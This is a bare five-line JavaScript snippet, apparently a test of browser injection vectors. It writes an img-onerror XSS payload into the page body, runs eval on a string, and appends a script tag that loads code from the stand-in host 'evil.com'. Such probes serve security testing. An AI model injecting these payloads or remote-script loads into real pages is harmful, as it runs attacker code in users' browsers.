document.body.innerHTML = '<img src=x onerror=alert("XSS")>';
eval('console.log("Eval test")');
const s = document.createElement('script');
s.src = 'https://evil.com/script.js';
document.head.appendChild(s);